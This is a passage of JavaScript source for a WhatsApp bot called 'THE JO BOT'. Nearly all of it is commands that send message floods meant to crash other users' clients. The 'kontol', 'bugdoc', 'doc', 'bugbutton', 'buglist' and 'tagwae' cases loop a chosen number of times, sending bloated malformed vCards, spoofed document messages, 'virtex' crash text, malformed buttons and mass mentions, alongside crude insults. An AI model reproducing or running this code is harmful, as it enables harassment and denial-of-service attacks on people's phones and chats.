const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© THE JO BOT${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:THE JO BOT\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
hisoka.sendContact(m.chat, global.owner, fkontaak)
}
}
break
case 'kontol': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) {
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© THE JO BOT${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:THE JO BOT\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
hisoka.sendContact(m.chat, global.premium, fkontaak)
}
}
break
	case 'bugdoc':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `THE JO BOT${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
}
}
break
case 'doc':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
y1 = fs.readFileSync('./virtex/iphone.mp3')
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 THE JO BOT 🔥 ${doc}.mp3`, quoted: m})
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 THE JO BOT 🔥 ${jobot}.txt`, quoted: m})
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 THE JO BOT 🔥 ${ngazap}.js`, quoted: m})
}
}
break
case 'bugbutton':{
              if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
]

const buttonMessage = {
    text: `${philips}`,
    footerText: 'Pe',
    buttons: buttons,
    headerType: 1
}
hisoka.sendMessage(m.chat, buttonMessage)
}
}
               break
case 'buttonfour':{
              if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await hisoka.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonfour}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonfour}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: buttonfour}, type: 1}
]

const buttonMessage = {
    text: `${four}`,
    footerText: 'Pe',
    buttons: buttons,
    headerType: 1
}
hisoka.sendMessage(m.chat, buttonMessage,  { quoted: a })
}
}
               break
case 'buglist':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolputralist = [
                {
                title: `༒✪͜͡★➤⃨⃞⃟𝙸𝚃𝚉 𝙼𝙴 𝙹𝙾➤⃨⃞⃟★፝͜͡✪༒ ${ngazap} ${jobot}`,
                rows: [
                {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `THE JO BOT`},
                {title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
                ]
                }
                ]
                hisoka.sendListMsg(m.chat, `༒✪͜͡★➤⃨⃞⃟𝙸𝚃𝚉 𝙼𝙴 𝙹𝙾➤⃨⃞⃟★፝͜͡✪༒`, hisoka.user.name, `Hay Ngentod`, `༒✪͜͡★➤⃨⃞⃟𝙸𝚃𝚉 𝙼𝙴 𝙹𝙾➤⃨⃞⃟★፝͜͡✪༒`, kontolputralist, m)
                }
                }
break
case 'tagwae': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group 
                if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
                 a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                let teks = jobot
                for (let mem of participants) {
                teks += `│➳ @${mem.id.split('@')[0]}\n`
                }
                hisoka.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: a })
                }
                }
                break

case 'slebew' : {
                    if(!m.key.fromMe) return
if (!isCreator) return
                    a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"THE JO BOT SLEBEW"}, {quoted: a})
                    m.reply(`© THE JO BOT`)
                     }
                break
case 'reaksipc' : {
if (!isCreator) return
